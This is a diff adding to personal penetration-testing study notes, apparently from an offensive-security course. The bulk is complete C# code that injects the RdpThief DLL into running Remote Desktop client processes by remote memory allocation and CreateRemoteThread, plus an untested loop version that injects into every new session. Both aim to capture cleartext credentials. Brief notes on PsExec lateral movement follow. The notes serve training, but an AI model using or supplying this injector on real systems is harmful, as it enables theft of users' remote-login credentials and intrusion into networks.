@@ -251,7 +251,98 @@ RDPTheif was used which s=uses detours to hook onto the APIS
 
 https://github.com/0x09AL/RdpThief
 
-load rdp theifdll
+load rdpthief.dll - not able to install because of the nuget package
+
+```C#
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+namespace Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
+        processId);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
+        dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
+        lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
+        SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        static void Main(string[] args)
+        {
+            String dllName = "C:\\Tools\\RdpThief.dll";
+            Process[] mstscProc = Process.GetProcessesByName("mstsc");
+            int pid = mstscProc[0].Id;
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            IntPtr outSize;
+            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName),
+            dllName.Length, out outSize);
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0,IntPtr.Zero);
+        }
+    }
+}
+```
+
+more modifications - not tested
+
+```C#
+static void Main(string[] args)
+{
+String dllName = "C:\\Tools\\RdpThief.dll";
+while(true)
+{
+Process[] mstscProc = Process.GetProcessesByName("mstsc");
+if(mstscProc.Length > 0)
+{
+for(int i = 0; i < mstscProc.Length; i++)
+{
+int pid = mstscProc[i].Id;
+IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+IntPtr outSize;
+Boolean res = WriteProcessMemory(hProcess, addr,
+Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
+"LoadLibraryA");
+IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr,
+0, IntPtr.Zero);
+}
+}
+Thread.Sleep(1000);
+}
+}
+```
+
+### 13.1.5.1 Exercises
+1. Repeat the attack in this section and obtain clear text credentials
+
+# Fileless Lateral Movement
+
+like PsExec and DCOM, require
+that services and files are written on the target system. Other techniques, such as PSRemoting,
+require ports to be open in the firewall that are not always permitted by default
+
+# authentication and execution theory
+
+psexec authenticates to SMB on the target host and accesses the DCE/RPC interface. PsExec will use this interace to access the service cotrol manager create new service and execute it. 
+
+The binary tha is executed by the service is copied to the target host
+
+
 
 
 
